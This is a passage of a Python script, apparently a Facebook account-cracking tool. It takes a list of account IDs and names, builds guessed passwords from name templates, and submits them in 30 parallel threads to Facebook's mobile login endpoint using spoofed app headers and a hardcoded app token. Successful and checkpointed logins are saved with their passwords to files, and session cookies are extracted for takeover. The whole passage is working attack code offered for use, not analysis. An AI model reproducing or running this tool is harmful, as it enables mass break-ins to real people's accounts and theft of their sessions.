                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                print(' \033[1;97m'+cookies)
                open('/sdcard/PRO-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;96m [PRO-CP] '+acc+'| '+pword+'')
                cpacc.append(acc)
                open('/sdcard/PRO-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def method2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[1;97m[\033[1;97mPRO-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m [PRO-OK] '+acc+'| '+pword+'  ')
                open('/sdcard/PRO-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m [PRO-CP] '+acc+'| '+pword)
                cpacc.append(acc)
                open('/sdcard/PRO-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(method2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(method1, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(method1, accounts)
    exit()  
      



####
    
  
    
menu()